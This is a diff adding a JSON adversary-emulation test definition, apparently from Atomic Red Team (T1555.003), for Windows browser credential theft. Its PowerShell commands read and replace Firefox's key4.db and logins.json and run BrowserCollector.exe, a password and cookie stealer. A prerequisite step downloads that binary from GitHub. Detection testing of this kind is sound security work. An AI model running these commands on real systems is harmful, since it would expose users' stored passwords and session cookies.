@@ -1,0 +1,41 @@
+{
+    "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
+    "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line. If using to test with Firefox, if the browser is x64 you need to use the x64 build ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nCopy-Item $profile\\key4.db -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nCopy-Item $profile\\logins.json -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\key4.db\" -Destination $profile\\ > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\logins.json\" -Destination $profile\\ > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n\"\"|.\\BrowserCollector.exe\n",
+        "cleanup_command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination $profile\\ > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\key4.db\" > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\logins.json\" > $null\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Firefox must be on the device.\n",
+            "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\FirefoxStubInstaller.exe\"\nInvoke-WebRequest -OutFile $installer \"https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US\"\nStart-Process -FilePath $installer -Wait\nStop-Process -Name \"firefox\"\n"
+        },
+        {
+            "description": "BrowserCollector must exist in the bin directory\n",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\""
+        },
+        {
+            "description": "Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\") {exit 0} else {exit 1}",
+            "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\logins.json\" "
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
